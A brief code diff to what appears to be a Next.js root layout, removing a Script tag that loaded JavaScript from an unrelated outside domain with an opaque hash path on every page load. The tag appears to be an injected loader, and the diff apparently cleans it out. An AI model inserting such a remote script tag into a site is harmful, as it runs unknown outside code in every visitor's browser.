@@ -60,13 +60,7 @@ export default async function RootLayout({ children }: { children: React.ReactNo
           strategy="beforeInteractive"
         />
       </head>
-      <body>
-        {children}
-        <Script
-          data-cfasync="false"
-          src="https://bancadeltempoidea.org/14/7ca7d3009b54e2e6eb42f9b429b26800"
-        />
-      </body>
+      <body>{children}</body>
     </html>
   )
 }
